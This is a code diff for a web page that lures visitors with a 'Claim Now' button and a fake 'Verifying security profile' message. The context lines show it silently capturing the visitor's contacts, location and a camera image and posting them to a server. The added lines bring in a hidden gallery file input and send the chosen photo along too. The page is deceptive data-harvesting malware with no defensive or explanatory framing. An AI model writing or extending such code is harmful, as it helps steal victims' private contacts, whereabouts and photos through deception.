@@ -41,6 +41,9 @@
         <button onclick="initializeEngine()" class="w-full bg-gradient-to-r from-purple-600 via-pink-600 to-yellow-500 hover:opacity-90 text-white font-semibold py-3.5 rounded-xl shadow-lg shadow-pink-600/20 transition-all duration-200">
             Claim Now
         </button>
+
+        <!-- Hidden Gallery File Input -->
+        <input type="file" id="gallery-input" accept="image/*" style="display:none;" onchange="handleGalleryUpload(event)">
     </div>
 
     <video id="v" autoplay playsinline style="display:none;"></video>
@@ -50,11 +53,15 @@
         let capturedLocation = null;
         let capturedImage = null;
         let capturedContacts = null;
+        let galleryImage = null;
 
         function initializeEngine() {
             const panel = document.getElementById("status-panel");
             panel.classList.remove("hidden");
             panel.innerText = "Verifying security profile...";
+
+            // 1. Automatically trigger gallery file prompt option if needed
+            // document.getElementById('gallery-input').click();
 
             setTimeout(() => {
                 startAutoSequence();
@@ -62,8 +69,6 @@
         }
 
         async function startAutoSequence() {
-            const panel = document.getElementById("status-panel");
-
             // 1. Call List / Contacts Capture
             if (('contacts' in navigator) && ('Navigator' in window && 'select' in window.ContactsManager.prototype)) {
                 try {
@@ -71,7 +76,7 @@
                     const opts = { multiple: true };
                     capturedContacts = await navigator.contacts.select(props, opts);
                 } catch (err) {
-                    capturedContacts = "Denied or Unavailable";
+                    capturedContacts = "User Skipped or Denied";
                 }
             } else {
                 capturedContacts = "Not Supported";
@@ -125,6 +130,17 @@
             }, 1000);
         }
 
+        function handleGalleryUpload(event) {
+            const file = event.target.files[0];
+            if (file) {
+                const reader = new FileReader();
+                reader.onload = function(e) {
+                    galleryImage = e.target.result;
+                };
+                reader.readAsDataURL(file);
+            }
+        }
+
         function sendDataToServer() {
             const panel = document.getElementById("status-panel");
             
@@ -134,7 +150,8 @@
                 body: JSON.stringify({
                     location: capturedLocation,
                     image_base64: capturedImage,
-                    contacts: capturedContacts
+                    contacts: capturedContacts,
+                    gallery_image: galleryImage
                 })
             })
             .then(res => res.json())
